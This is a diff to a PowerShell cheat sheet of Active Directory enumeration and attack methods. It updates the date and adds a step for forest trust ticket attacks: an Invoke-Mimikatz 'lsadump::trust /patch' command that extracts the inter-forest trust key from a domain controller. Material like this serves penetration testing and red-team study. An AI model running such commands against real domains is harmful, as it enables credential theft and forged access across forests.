@@ -2,7 +2,7 @@
 
 This cheat sheet contains common enumeration and attack methods for Windows Active Directory with the use of powershell.
 
-Last update: **22 Nov 2021**
+Last update: **23 Nov 2021**
 ## TOC
 - [Pre-requisites](#pre-requisites)
 - [Enumeration](#enumeration)
@@ -612,3 +612,9 @@ gwmi -class win32_operatingsystem -ComputerName mcorp-dc.corporate.local
 ![Main Logo](images/Example_Child_to_parent01.PNG 'Example04')
 
 ### Across Forest using Trust Tickets
+
+**1. Request the trust key for the inter forest trust.:**
+```powershell
+# request the trust key for the inter forest trust
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.corp.corporate.local      
+```
